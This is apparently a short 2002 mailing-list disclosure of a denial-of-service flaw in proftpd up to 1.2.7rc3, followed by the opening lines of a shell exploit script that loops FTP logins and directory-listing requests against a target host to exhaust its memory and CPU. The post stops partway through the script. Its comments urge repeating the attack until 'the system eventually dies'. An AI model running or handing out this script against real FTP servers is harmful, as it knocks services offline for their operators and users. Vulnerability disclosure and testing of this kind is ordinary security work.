Hello,

proftpd is vulnerable to denial of service similar to the list
*/../*/../*/../*.

#!/bin/sh
#
# proftpd <=1.2.7rc3 DoS - Requires anonymous/ftp login at least
# might work against many other FTP daemons
# consumes nearly all memory and alot of CPU
#
# tested against slackware 8.1 - proftpd 1.2.4 and 1.2.7rc3
#
# 7-dec-02 - detach  -  www.duho.org
#
# use: ./prodos.sh <host> <user> <pass>
# do this some more to make sure the system eventually dies

while [ $cnt -gt 0 ] ; do
ftp -n << EOF&
o $1
quote user $2
